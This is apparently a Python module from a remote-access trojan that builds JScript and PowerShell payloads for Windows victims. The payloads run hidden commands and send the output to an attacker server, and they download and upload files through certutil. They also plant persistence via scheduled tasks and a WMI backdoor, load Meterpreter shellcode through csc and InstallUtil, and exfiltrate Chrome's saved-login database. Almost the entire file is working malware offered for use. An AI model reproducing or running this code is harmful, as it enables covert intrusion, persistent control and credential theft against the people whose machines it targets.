import config
import re, base64
def powershell_encode(data):
    #https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py
    #Carlos - aka Darkoperator wrote the code below:
    # blank command will store our fixed unicode variable
    blank_command = ""
    powershell_command = ""
    # Remove weird chars that could have been added by ISE
    n = re.compile(u'(\xef|\xbb|\xbf)')
    # loop through each character and insert null byte
    for char in (n.sub("", data)):
        # insert the nullbyte
        blank_command += char + "\x00"
    # assign powershell command as the new one
    powershell_command = blank_command
    # base64 encode the powershell command
    powershell_command = base64.b64encode(powershell_command)
    return powershell_command

class payload():
    def exit(self):
        p = '''
        window.close()
        '''
        return p
    def connect(self):
        client_payload = '''
        fname=Math.random().toString(36).substring(7)
        path=new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2)+'\\\\'+fname
        new ActiveXObject("WScript.Shell").Run("cmd /c tasklist /FO CSV /NH>"+path,0,true);
        fso1=new ActiveXObject("Scripting.FileSystemObject");
        f=fso1.OpenTextFile(path,1);
        message=f.ReadAll();
        f.Close();
        fso1=new ActiveXObject("Scripting.FileSystemObject");
        f =fso1.GetFile(path);
        f.Delete();
        count = message.split('rundll32').length-1;
        if(count == 1){
            setInterval('try {h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");h.SetTimeouts(0, 0, 0, 0);h.Open("GET", "http://{{server}}/rat/{{signature}}", false);h.Send();c = h.ResponseText;setTimeout(c);}catch(error){windows.close()}', 3000)                   
        }else if(count>=3){
           new ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);
        }else{
            window.close();
        }
        '''
        return client_payload

    def cmd(self, command):
        command = command.replace('\\', '\\\\').replace('\"', '\\\"')
        #cmd /c ?
        #r = new ActiveXObject("WScript.Shell").Exec("whoami");
        #while(!r.StdOut.AtEndOfStream){message=r.StdOut.ReadAll()}
        p = '''
        var message;
        try{
            fname=Math.random().toString(36).substring(7)
            path=new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2)+'\\\\'+fname
            new ActiveXObject("WScript.Shell").Run("cmd /c %s >"+path,0,true);
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f=fso1.OpenTextFile(path,1);
            message=f.ReadAll();
            f.Close();
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f =fso1.GetFile(path);
            f.Delete();
        }catch(err){
            message = err.message
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''%(command)
        return p
    def run(self, command):
        command = command.replace('\\', '\\\\').replace('\"', '\\\"')
        p = '''
        var message;
        try{
            r = new ActiveXObject("WScript.Shell").Run("%s",0,true);
            message = "success"
        }catch(err){
            message = err.message
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''%(command)
        return p
    def delete(self, path):
        path = path.replace('\\', '\\\\').replace('\"', '\\\"')
        p = '''
        var message;
        try{
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f =fso1.GetFile("%s");
            f.Delete();
            message = "success";
        }catch(err){
            message = err.message
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''%(path)
        return p
    def download(self, filename, savepath):
        savepath = savepath.replace('\\', '\\\\').replace('\"', '\\\"')
        p = '''
        var message;
        filename = "%s"
        savepath = "%s"
        b64savepath = savepath+".b64"
        try{
            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET","http://{{server}}/download?filename="+filename,false);
            g.Send();
            d = g.ResponseText;
            var fso = new ActiveXObject("Scripting.FileSystemObject")
            if (fso.FileExists(b64savepath)) fso.DeleteFile(b64savepath);
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f=fso1.CreateTextFile(b64savepath,true);
            f.WriteLine(d);
            f.Close();
            r = new ActiveXObject("WScript.Shell").Run("certutil -decode "+b64savepath+" "+savepath,0,true);
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f =fso1.GetFile(b64savepath);
            f.Delete();
            message = "success";
        }catch(err){
            message = err.message;
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''%(filename, savepath)
        return p
    def upload(self, path):
        path = path.replace('\\', '\\\\').replace('\"', '\\\"')
        p = '''
        var message;
        path = "%s";
        fso = new ActiveXObject("Scripting.FileSystemObject")
        if (!fso.FileExists(path)) message = 'file not exist!';
        else{
            try{
                tmp_path = path+".b64"
                var fso = new ActiveXObject("Scripting.FileSystemObject")
                if (fso.FileExists(tmp_path)) fso.DeleteFile(tmp_path);
                r = new ActiveXObject("WScript.Shell").Run("certutil -encode "+path+" "+tmp_path,0,true);
                fso1=new ActiveXObject("Scripting.FileSystemObject");
                f=fso1.OpenTextFile(tmp_path,1);
                message=f.ReadAll();
                f.Close();
                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                p.SetTimeouts(0, 0, 0, 0);
                p.Open("POST","http://{{server}}/upload/{{signature}}?pid={{pid}}&filename="+escape(path),false);
                p.Send(escape(message));
                message = p.ResponseText
                fso1=new ActiveXObject("Scripting.FileSystemObject");
                f =fso1.GetFile(tmp_path);
                f.Delete();
            }catch(err){
                message = err.message;
            }
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''%(path)
        return p
    def WindowsTasks(self, time):
        data = '''
        var message;
        try{
            new ActiveXObject("WScript.Shell").Run("at ''' + time + ''' /every:M,T,W,Th,F,S,Su rundll32.exe javascript:\\\\\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\\\\\";document.write();h=new%20ActiveXObject('WinHttp.WinHttpRequest.5.1');h.Open('GET','http://{{server}}/connect',false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){}",0,true);
            message = "success";
        }catch(err){
            message = err.message;
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''
        return data

    def RemoveWindowsTasks(self):
        return self.run('at /delete /yes')

    def WmiBackdoor(self):
        data1 = '''
        $filterName = 'WindowsManagementFilter'
        $consumerName = 'WindowsManagementConsumer'
        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE
        TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
        $Arg =@{
                Name=$consumerName
                    CommandLineTemplate='powershell.exe -window hidden -enc %s'
        }
        $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $Arg
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
        '''
        data2 = '''
        $a='rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://'''+'%s:%d'%(config.host, config.port)+'''/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){window.close()}';
        cmd /c $a;
        '''
        return self.run('powershell.exe -window hidden -enc %s'%powershell_encode(data1%(powershell_encode(data2))))
    def RemoveWmiBackdoor(self):
        data = '''
        Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%WindowsManagementFilter%'" | Remove-WmiObject -Verbose
        Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='WindowsManagementFilter'" | Remove-WmiObject -Verbose
        Get-WMIObject -Namespace root\Subscription -Class __EventConsumer | Remove-WmiObject -Verbose
        '''
        return self.run('powershell.exe -window hidden -enc %s'%powershell_encode(data))
    def MeterpreterShellcode(self):
        p = '''
        var message;
        fname=Math.random().toString(36).substring(7)
        tmpname=Math.random().toString(36).substring(7)
        path=new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2)+'\\\\'
        tmppath=path+tmpname
        path = path+fname
        try{
            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET","http://{{server}}/met_sc/{{signature}}",false);
            g.Send();
            d = g.ResponseText;
            var fso = new ActiveXObject("Scripting.FileSystemObject")
            if (fso.FileExists(path)) fso.DeleteFile(path);
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f=fso1.CreateTextFile(path,true);
            f.WriteLine(d);
            f.Close();
            new ActiveXObject("WScript.Shell").Run("C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v2.0.50727\\\\csc.exe /unsafe  /out:"+tmppath+" "+path,0,true);
            new ActiveXObject("WScript.Shell").Run("C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v2.0.50727\\\\InstallUtil.exe /logfile= /LogToConsole=false /U "+tmppath,0,true);
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f =fso1.GetFile(path);
            f.Delete();
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f =fso1.GetFile(tmppath);
            f.Delete();
            message = "success";
        }catch(err){
            message = err.message;
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''
        return p
    def PowershellMeterpreterx86(self):
        data = '''
        try{
            x64_path = 'c:\\\\windows\\\\syswow64\WindowsPowerShell\\\\v1.0\\\\powershell.exe'
            x32_path = 'c:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'
            var fso = new ActiveXObject("Scripting.FileSystemObject")
            if (fso.FileExists(x64_path)) path = x64_path;
            else path = x32_path
            new ActiveXObject("WScript.Shell").Run(path+' -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\\'http://{{server}}/met_ps/{{signature}}\\');" ',0,true);
            message = "success";
        }catch(err){
            message = err.message;
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''
        return data

    def init(self):
        data = '''
        function upload(path){
            if (!fso.FileExists(path)) return;
            try{ 
                tmp_path = path+".b64"
                var fso = new ActiveXObject("Scripting.FileSystemObject")
                if (fso.FileExists(tmp_path)) fso.DeleteFile(tmp_path);
                r = new ActiveXObject("WScript.Shell").Run("certutil -encode "+path+" "+tmp_path,0,true);
                fso1=new ActiveXObject("Scripting.FileSystemObject");
                f=fso1.OpenTextFile(tmp_path,1);
                message=f.ReadAll();
                f.Close();
                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                p.SetTimeouts(0, 0, 0, 0);
                p.Open("POST","http://{{server}}/upload/{{signature}}?pid={{pid}}&filename="+escape(path),false);
                p.Send(escape(message));
                message = p.ResponseText
                fso1=new ActiveXObject("Scripting.FileSystemObject");
                f =fso1.GetFile(tmp_path);
                f.Delete();
            }catch(err){
                message = err.message;
            }
        }
        appdata_path = new ActiveXObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
        chrome_passfile = appdata_path+'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'
        upload(chrome_passfile)
        '''
        return data